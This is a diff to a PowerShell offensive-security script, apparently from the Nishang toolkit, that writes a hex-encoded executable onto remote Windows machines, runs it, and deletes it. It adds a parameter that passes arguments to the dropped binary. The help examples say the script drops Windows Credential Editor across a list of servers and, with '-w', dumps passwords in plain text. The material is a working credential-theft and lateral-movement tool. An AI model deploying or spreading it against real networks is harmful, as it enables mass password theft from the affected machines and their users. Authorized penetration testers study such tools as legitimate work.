@@ -11,9 +11,19 @@ Access to remote machines are required to use this script.
 .PARAMETER VerboseErrors
 Use this parameter to get verbose error messages.
 
+.PARAMETER ExeArgs
+Use this parameter to pass arguments to the executable.
+
 .EXAMPLE
 PS > Invoke-Command -FilePath .\Run-EXEonRemote.ps1 -ComputerName (Get-Content .\servers.txt)
 Above command uses the credentials available with current powershell session and runs this script against multiple computers.
+Above drops and runs WCE on remote computer.
+
+.EXAMPLE
+PS > Invoke-Command -FilePath .\Run-EXEonRemote.ps1 -ArgumentList "-w" -ComputerName <computername>
+Above command uses the credentials available with current powershell session and runs this script against the computer name.
+Above drops and runs WCE on remote computer, passes the argument -w to wce.exe and dumps passwords in plain text. Note that double quotes ""
+around the argument is necessary.
 
 .LINK
 http://labofapenetrationtester.blogspot.com/2013/04/poshing-the-hashes.html
@@ -23,7 +33,8 @@ http://code.google.com/p/nishang
 
 
 
-Param ([Switch] $VerboseErrors)
+Param ([Switch] $VerboseErrors,
+[Parameter(Position = 0)] [String] $ExeArgs)
 
 function Run-EXEonRemote
 {
@@ -48,7 +59,9 @@ function Run-EXEonRemote
     }
     [Byte[]] $temp = $hexdump -split ' '
     [System.IO.File]::WriteAllBytes("$EXE", $temp)
-    $cmd = "$EXE -w"
+
+
+    $cmd = "$EXE $ExeArgs"
     Invoke-Expression $cmd
     start-sleep -Seconds 5
     Remove-Item $EXE
